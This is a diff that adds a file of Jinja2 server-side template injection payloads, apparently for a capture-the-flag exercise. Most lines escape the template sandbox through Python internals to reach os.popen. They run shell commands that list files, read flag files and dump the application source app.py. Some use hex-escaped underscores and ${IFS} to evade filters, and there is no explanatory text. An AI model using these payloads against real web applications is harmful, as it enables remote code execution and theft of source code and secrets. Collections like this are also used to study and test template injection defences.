@@ -1,0 +1,20 @@
+{% for item in navigation %}
+
+{% print("hello word" * 25 + str((5 + 5)) %}
+
+
+{% print(self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()) %}
+
+{% print(attr(chr(95) * 2 + "import" + chr(95) * 2)) % }
+
+{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls${IFS}-l')|attr('read')()%}{%print(a)%}{%endwith%}
+
+{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat${IFS}flag')|attr('read')()%}{%print(a)%}{%endwith%}
+
+{%with a=request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat${IFS}app\x2epy')|attr('read')()%}{%print(a)%}{%endwith%}
+
+
+
+
+
+
